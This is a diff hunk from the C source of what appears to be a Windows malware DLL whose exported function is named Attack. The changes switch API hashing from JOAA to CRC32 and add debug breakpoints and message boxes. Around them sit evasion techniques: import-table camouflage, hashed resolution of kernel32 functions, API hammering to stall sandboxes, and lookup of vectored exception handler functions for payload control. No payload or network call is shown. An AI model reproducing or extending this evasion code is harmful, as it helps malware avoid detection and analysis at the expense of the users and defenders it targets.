@@ -25,12 +25,17 @@ extern __declspec(dllexport) int Attack()
 
     IatCamouflage();
 
-    fnAddVectoredExceptionHandler        pAddVectoredExceptionHandler     = (fnAddVectoredExceptionHandler)GetProcAddressH(GetModuleHandleH(kernel32dll_JOAA), AddVectoredExceptionHandler_JOAA);
-    fnRemoveVectoredExceptionHandler     pRemoveVectoredExceptionHandler  = (fnRemoveVectoredExceptionHandler)GetProcAddressH(GetModuleHandleH(kernel32dll_JOAA), RemoveVectoredExceptionHandler_JOAA);
+    MessageBoxA(NULL, "Hello", "Hello", MB_OK);
+    __debugbreak();
+    HMODULE kernel32_handle = GetModuleHandleH(kernel32_CRC32);
+    __debugbreak();
+    fnAddVectoredExceptionHandler        pAddVectoredExceptionHandler     = (fnAddVectoredExceptionHandler)GetProcAddressH( kernel32_handle, AddVectoredExceptionHandler_CRC32);
+    fnRemoveVectoredExceptionHandler     pRemoveVectoredExceptionHandler  = (fnRemoveVectoredExceptionHandler)GetProcAddressH(kernel32_handle, RemoveVectoredExceptionHandler_CRC32);
+    __debugbreak();
 
     ApiHammering(1000);
 
-    if (!pAddVectoredExceptionHandler || !pRemoveVectoredExceptionHandler)
+    if (pAddVectoredExceptionHandler == NULL || pRemoveVectoredExceptionHandler == NULL)
     {
         MessageBoxA(NULL, "ERROR", "ERROR", MB_OK);
         return -1;
